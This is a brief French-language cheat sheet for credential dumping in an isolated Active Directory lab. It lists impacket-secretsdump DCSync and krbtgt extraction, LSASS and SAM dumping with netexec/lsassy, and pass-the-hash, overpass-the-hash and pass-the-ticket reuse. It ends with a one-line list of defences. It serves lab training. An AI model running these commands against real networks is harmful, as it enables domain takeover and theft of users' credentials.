# Dump de credentials — aide-mémoire (lab isolé GOAD-X uniquement)

## NTDS (DCSync)
impacket-secretsdump 'CORP/adm:pass@<dc>' -just-dc
impacket-secretsdump 'CORP/DC01$@<dc>' -k -no-pass -just-dc-user krbtgt

## LSASS / SAM (admin local requis)
nxc smb <host> -u adm -p 'pass' --local-auth -M lsassy
impacket-secretsdump 'CORP/adm:pass@<host>'

## Réutilisation
nxc smb <host> -u Administrator -H <NThash>                 # PtH
impacket-getTGT 'CORP/adm' -hashes :<NThash> -dc-ip <dc>    # OverPtH
# PtT : export KRB5CCNAME=<ticket>.ccache

## Rappels défense : Credential Guard, WDigest off, droits de réplication restreints.
